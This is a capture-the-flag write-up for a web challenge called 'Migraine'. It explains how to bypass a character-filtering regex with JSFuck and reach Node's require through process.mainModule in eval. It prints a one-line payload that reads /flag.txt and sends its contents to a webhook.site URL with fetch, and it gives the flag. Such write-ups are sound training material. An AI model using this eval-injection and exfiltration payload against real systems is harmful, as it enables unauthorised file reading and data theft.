# Migraine
Category: Web

## Description
Author: `RougeGuardian`, `Mr. Blade`

This challenge gave me a migraine to develop, hopefully it doesn't do the same to you.

```
To: Acme Production Team
From: Acme Development Team
Yeah we're 3 weeks behind schedule and we need to push this to production. As for the issue on section 3, yeah we couldn't figure out how to get output from eval so we will just have to roll with it. And for the security team, please assure them that we filter out all numbers and letters in the first round so no one can write malicious things. I think we're good to go!
```

NOTE: Changes will no longer be persistent between connections.

[http://migraine.tamuctf.com](http://migraine.tamuctf.com)

Attachments: [migraine.zip](attachments/migraine.zip)

## Write-up
- Clicking "Run" triggers the `submitCode()` function, sending a POST request to an endpoint with user code in the `src` body parameter.
- The backend validates the code using a regex and evaluates it if the checks pass.
- The challenge involves bypassing the regex and performing Remote Code Execution (RCE) via `eval()`.
- `JSFuck`, an esoteric JavaScript subset, can bypass the regex due to its unique character requirements.
- The `eval()` call is direct and uses the local scope, hindering direct access to `require()` and preventing simple module imports like `fs`.
- However, `eval()` is a function property of the global object and can access `process`, which has references to `require()` through `mainModule`.
- Accessing `require()` via `eval()` and `process.mainModule` enables the use of the `fs` module to read the flag file.
- A payload can be constructed to read the flag and send it via a `fetch` request (also conveniently found in the global object) to a designated webhook.
- Example payload: `fetch('https://webhook.site/35e3671b-6a1c-45c7-be30-0b9bc8d2ab6c/?flag=' + process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8'));`.

Flag: `gigem{JS_1s_5up3r_w4cky_4nd_w3ird}`
